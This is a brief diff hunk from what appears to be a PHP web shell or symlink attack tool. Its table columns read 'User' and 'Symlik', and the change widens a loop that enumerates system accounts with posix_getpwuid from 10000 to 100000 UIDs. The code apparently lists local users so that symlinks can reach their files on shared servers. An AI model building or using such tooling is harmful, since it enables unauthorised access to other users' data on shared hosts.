@@ -30,7 +30,7 @@ if($_POST['up']) {
 <tr><td>No</td><td>User</td><td>Symlik</td></tr>
 <?php
 $x=0;
-for($i=0; $i < 10000; $i++) {
+for($i=0; $i < 100000; $i++) {
         $uid=posix_getpwuid($i);
         if(!empty($uid)) {
                 $x++;
